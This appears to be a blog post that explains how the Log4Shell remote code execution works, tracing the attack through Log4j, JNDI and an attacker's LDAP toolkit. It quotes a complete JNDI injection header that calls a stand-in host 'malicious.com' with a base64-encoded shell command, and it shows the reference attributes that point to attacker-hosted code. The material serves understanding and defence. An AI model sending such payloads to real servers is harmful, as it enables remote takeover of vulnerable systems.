# Anatomy of an exploit: a source-level walkthrough of the Log4j RCE

Here's a source-level tour of how the Log4Shell vulnerability works. We wrote this partly to help our users and customers understand the intricacies of the vulnerability so they can better protect their organizations in the future, and partly to satisfy our own curiosity about the mechanics of what was one of the most critical security vulnerabilities in recent memory.

Our journey will take us into the internals of how the most popular Java logging library implements string substitution, into the bowels of the JDK to inspect a core API that is powerful--perhaps too much so, and into the architecture of an attack server designed to exploit an entire class of vulnerabilities similar to Log4Shell.

Let's begin with a high-level diagram that outlines the key steps involved in the attack:

![attack diagram](https://s3.us-west-1.amazonaws.com/beyang.org-public/images/log4j.svg)

1. The attack begins with an attacker issuing a HTTP request to our vulnerable web service containing a string like `${jndi:ldap://malicious.com}`.
1. Our server receives the request and then logs the HTTP header metadata, which contains the malicious string.
1. Log4j will interpolate the value of `${jndi:ldap://malicious.com}` by using JNDI, a name lookup mechanism provided by the JDK, which in turn will attempt to resolve `ldap://malicious.com` by sending an LDAP request to the attacker's server.
1. The attacker's server will send a response containing metadata that identifies a Java class and a URL pointing back to the attacker's server as the place from which to fetch the class.
1. The vulnerable server fetches the class from the attacker's server.
1. The attacker's server responds with a malicious class, which the vulnerable server then receives and instantiates in order to finish computing the interpolated value.

Now for the deep dive into source code. We'll be walking through what happens at each step of the exploit across the code of the vulnerable service, Log4j, the JDK, and the attacker's server:

## Part 0: The vulnerable code

We start with a vulnerable application logging a HTTP request header value in a seemingly innocuous way:

https://sourcegraph.com/github.com/christophetd/log4shell-vulnerable-app/-/blob/src/main/java/fr/christophetd/log4shell/vulnerableapp/MainController.java?L17-20

If we were embedding this value unsanitized in a SQL query or a website, there would clearly be potential for a SQL injection or reflected XSS attack, but we're just logging it, so what's the worst that could happen? Well, let's take a look at what happens when an attacker sends a malicious payload as the header value.

## Part 1: Log4j

Say an attacker issues a HTTP request with the following request header to our vulnerable server:

```text
X-Api-Version: ${jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}
```

There are different components to this payload that will come into play in different parts of the exploit:

* The first part is the string interpolation syntax and JNDI prefix `${jndi:ldap://...}` which will instruct Log4j to interpolate the value for the name that follows using the LDAP substitution mechanism in JNDI.
* Next comes the host and port `malicious.com:1389`, which will direct the LDAP request to the attacker's server.
* The URL path instructs the attacker's server as to what kind of response to construct. The last component of this path, `dG91Y2ggL3RtcC9wd25lZAo=`, is the base64 encoding of the shell command, "touch /tmp/pwned", which we desire to execute on the vulnerable server. (This command is obviously innocuous, but the attacker could make the vulnerable server execute any arbitrary command by base64-encoding it and including that as part of the header value.)

Inside Log4j, there is a method for substituting values in format strings. It looks for the string interpolation syntax, `${}`:

https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/pattern/MessagePatternConverter.java?L128-134

Further down the call stack, we get into the interpolation logic, which selects a lookup method based on the prefix of the name stored in the argument `String var`, which is `jndi:ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`:

https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/lookup/Interpolator.java?L217-232

The `jndi` prefix selects for the JNDI lookup, which brings us into the `JNDIManager` class:

https://sourcegraph.com/github.com/apache/logging-log4j2@rel/2.14.1/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java?L171-173

The value of the `String name` argument is `ldap://malicious.com:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`. This method sits at the interface between Log4j and JNDI. In Log4j versions 2.14 and prior, it's the pretty short passthrough method shown above. In subsequent patched Log4j versions, however, the method has been significantly lengthened to include sanitization and filtering steps:

https://sourcegraph.com/github.com/apache/logging-log4j2@4b789c8572d1762cd55f051971d91e44f0628908/-/blob/log4j-core/src/main/java/org/apache/logging/log4j/core/net/JndiManager.java?L221-274

This updated version of the method hints at the specific exploit paths that are now guarded against. Whitelists have been added for allowed hosts, protocols, and class names, with special attention paid to names that use the `ldap://` URL scheme. This extra sanitization code would catch our attacker payload and prevent the name from being passed to JNDI.

Why exactly is our `ldap://`-prefixed payload so dangerous if passed directly to `this.context.lookup()`? Let us find out.


## Part 2: JNDI

In this part of our journey, we leave the Log4j codebase for the source code for JNDI, in the JDK. [JNDI](https://docs.oracle.com/javase/jndi/tutorial/getStarted/overview/index.html) is a directory name lookup API that enables named resources to be loaded at runtime. Relevant to our attack, if the lookup names are LDAP URLs, *the loadable resources can be Java classes*.

The `this.context.lookup(name)` above jumps us into the `InitialContext` class:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/javax/naming/InitialContext.java?L408-410

This method breaks the lookup into two parts: a context and then a subsequent lookup within that context. If the name we specify is a URL, the context will be determined by the URL scheme:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/javax/naming/InitialContext.java?L330-343

JNDI supports a variety of lookup mechanisms keyed by URL scheme. Because our name has the `ldap` URL scheme, the `NamingManager.getURLContext` invocation returns an instance of `ldapURLContext`, which then performs the lookup.

https://sourcegraph.com/jdk@v11/-/blob/java.naming/com/sun/jndi/url/ldap/ldapURLContext.java?L90-96&subtree=true

This code makes use of Java's inheritance structure. `ldapURLContext::lookup` invokes `GenericURLContext::lookup`:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/com/sun/jndi/toolkit/url/GenericURLContext.java?L203-211

...which in turn invokes `getRootURLContext`, an abstract method defined in `ldapURLContext::getRootURLContext`:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/com/sun/jndi/url/ldap/ldapURLContext.java?L59-62

...which finally invokes `ldapURLContextFactory::getUsingURLIgnoreRootDN`, which returns an instance of `LdapCtx` with fields pointing to host malicious.com:1389:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/com/sun/jndi/url/ldap/ldapURLContextFactory.java?L59-60&subtree=true

Our context in hand, we then invoke `lookup` on this instance of `LdapCtx`, which then issues the LDAP request over the network, passing the name argument (`nm`), `Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`, to the LDAP client:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/com/sun/jndi/ldap/LdapCtx.java?L2013-2026&subtree=true

> Aside: Our specific exploit involves manipulating the vulnerable server into making an LDAP request that ultimately leads to an RCE, but there are other vectors that lead to both RCE and non-RCE exploits. Indeed, early mitigation efforts focused on LDAP, which led [attackers to shift their strategy to other protocols like RMI](https://blogs.juniper.net/en-us/threat-research/log4j-vulnerability-attackers-shift-focus-from-ldap-to-rmi) and [DNS](https://www.microsoft.com/security/blog/2021/12/11/guidance-for-preventing-detecting-and-hunting-for-cve-2021-44228-log4j-2-exploitation/). The updates to the source code in 2.14.0 (primarily, the additional checks added to `JndiManager::lookup`) defended against these other vectors by relying on explicit whitelists.

## Part 3: Malicious LDAP server

Across the Internet, our attacker's server awaits the LDAP request, listening on malicious.com:1389. Our attacker's server is fairly featureful, containing different controller classes to field different payload types that correspond to different exploit paths. The universe of JNDI vulnerabilities is large enough that hackers and security researchers have created these general toolkits completing different exploit paths. It routes the request to a specific controller depending on the URL path (returned from `result.getRequest().getBaseDN()`):

https://sourcegraph.com/github.com/sickcodes/JNDIExploit/-/blob/src/main/java/com/feihong/ldap/LdapServer.java?L72-96#L72:17-72:36

The controllers are registered to path prefixes using a Java annotation:

https://sourcegraph.com/github.com/sickcodes/JNDIExploit/-/blob/src/main/java/com/feihong/ldap/controllers/BasicController.java?L15-16

The server iterates through the annotated controller classes on startup and adds the mapping to a field of the `LdapServer` instance:

https://sourcegraph.com/github.com/sickcodes/JNDIExploit@7753e3a3924ae4527891f4a708c2d7151d023b39/-/blob/src/main/java/com/feihong/ldap/LdapServer.java?L46-64


Our request, with its URL path of `Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=`, is routed to a `BasicController` instance, which further parses the request type ("command") from the URL path into the `type` variable:

https://sourcegraph.com/github.com/sickcodes/JNDIExploit@7753e3a3924ae4527891f4a708c2d7151d023b39/-/blob/src/main/java/com/feihong/ldap/controllers/BasicController.java?L90-103

and then feeds the remainder of the path to a template for shell commands (`case command` in the switch statement below):

https://sourcegraph.com/github.com/sickcodes/JNDIExploit/-/blob/src/main/java/com/feihong/ldap/controllers/BasicController.java?L15-39

The `CommandTemplate` class expects a base64-encoded shell command and writes out a Java class file containing bytecode executing that shell command (in our case, `touch /tmp/pwned`, which we base64 decoded from `dG91Y2ggL3RtcC9wd25lZAo=`) on initialization. Here is what the code that generates the class looks like:

https://sourcegraph.com/github.com/sickcodes/JNDIExploit/-/blob/src/main/java/com/feihong/ldap/template/CommandTemplate.java?L39-144

Our attacker's server then caches the generated class, but doesn't send the class directly back. Instead, it sends an LDAP response containing a Java naming reference, which the vulnerable server will then resolve to a remote URL pointing to the malicious class (or more precisely, the malicious factory class).

https://sourcegraph.com/github.com/sickcodes/JNDIExploit/-/blob/src/main/java/com/feihong/ldap/controllers/BasicController.java?L80-87

> Aside: Our exploit in this case involves the attacker server returning an LDAP response containing a JNDI Reference, but there are at least 2 other ways in which a malicious LDAP response can trigger an RCE, covered [here](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf).

## Part 4: Receiving the malicious LDAP response

Back in our vulnerable app code, we receive the LDAP response:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/com/sun/jndi/ldap/LdapCtx.java?L2013-2026&subtree=true

The result gets returned up through a few stack frames:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/com/sun/jndi/ldap/LdapCtx.java?L1056

At this point, we haven't yet loaded the malicious class file from the attacker's server. This happens further down the `c_lookup` method where the parsed LDAP response parameters have been decoded into a set of attributes that parameterize a call to `DirectoryManager.getObjectInstance`:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/com/sun/jndi/ldap/LdapCtx.java?L1114-1115

The `attrs` variable at this point contains a hash table with the following values:

```
objectClass: javaNamingReference
javaCodeBase: http://malicious.com:8888/
javaFactory: ExploitDLFzSVQjFv
javaClassName: foo
```

The `javaCodeBase`, `javaFactory`, and `javaClassName` values were all parsed from our malicious LDAP response. The `javaCodeBase` value tells the DirectoryManager to fetch the factory class `ExploitDLFzSVQjFv` from "http://malicious.com:8888", where our attacker service is ready to serve the generated malicious class.

https://sourcegraph.com/jdk@v11/-/blob/java.naming/javax/naming/spi/NamingManager.java?L165-176

Our attacker server receives the HTTP request for the class file and responds with the cached malicious class (`ExploitDLFzSVQjFv`) generated earlier from `CommandTemplate`:

https://sourcegraph.com/github.com/sickcodes/JNDIExploit/-/blob/src/main/java/com/feihong/ldap/HTTPServer.java?L92-108&subtree=true

Back in our vulnerable app, we receive the response and create a new instance of the malicious factory class `ExploitDLFzSVQjFv`:

https://sourcegraph.com/jdk@v11/-/blob/java.naming/javax/naming/spi/NamingManager.java?L179-180

It is here that the malicious code we received from the attacker server is run. In our case, that means by this point in the execution, the file `/tmp/pwned` has been created and the RCE has run successfully.


## Reflections: bridging gaps

<!--
TODO: more reflective thoughts here

* How many such exploits exist?
* How hard are they to find?
* How long are they known to some before being made known to all?
* Software supply chain
* OSS maintainers

Remaining TODO:

* Fix snippet issue
* Annotated snippets (maybe later?)
* Publish
-->

This concludes our source-level walkthrough of the Log4Shell vulnerability. You now understand how the exploit works as well as anyone. So now what?

Well, there is much more work to be done beyond taking the immediate remediation steps and updating your dependencies to the latest versions. The Log4j vulnerability is a reminder that there are still significant gaps in the way we build software:

* The gap between the point in time when you learn about a vulnerability to the point in time when your code is fully patched. For many, this gap was not hours or days, but weeks that stretched into weekends and holidays.
* The gap between our heavy use of third-party dependencies and our shallow understanding of how those dependencies work. Before reading this post, how many developers were aware of Log4j's string interpolation or the myriad of lookup protocols supported by JNDI?
* The gap between source code availability and true source code accessibility. What fraction of your dependencies have you ever viewed the source code of?
* The gap between security and software engineers, who often work separately without close collaboration. If you're a security engineer, when was the last time you spent significant time reading application code? If you're an application engineer, when was the last time you reviewed your code with a security mindset?

The path to bridging all these gaps lies through source code, and tools that facilitate the shared understanding of code can play a crucial role in filling these gaps. Imagine if the developer who discovered and reported the issue had also found it straightforward enough to submit a patch in addition to urging, ["Please hurry up"](https://www.infoworld.com/article/3645131/how-developers-scrambled-to-secure-the-log4j-vulnerability.html), as knowledge of the exploit spread on WeChat forums? Weeks could have been saved, the burden of the patch would not have fallen only on the shoulders of volunteer maintainers, and so many human-hours of scrambling and overtime could have been avoided with a more orderly and timely patch release.

We hope interactive documentation like this can link high-level understanding to specific versioned blocks of source code, and thereby be a force multiplier for disseminating a shared understanding of code and security--across individuals, teams, and organizational boundaries. If you found this post useful, consider forking it, creating a walkthrough of your own for a library you rely on, and sharing it with others! As another example, you can look at the [Interactive introduction to OpenVSCode Server](https://sourcegraph.com/github.com/gitpod-io/openvscode-server@docs/-/blob/sourcedive.snb.md).

## Acknowledgements

The following were extremely helpful resources when writing this post:

* https://www.lunasec.io/docs/blog/log4j-zero-day/
* https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf
* https://github.com/christophetd/log4shell-vulnerable-app
* https://github.com/sickcodes/JNDIExploit
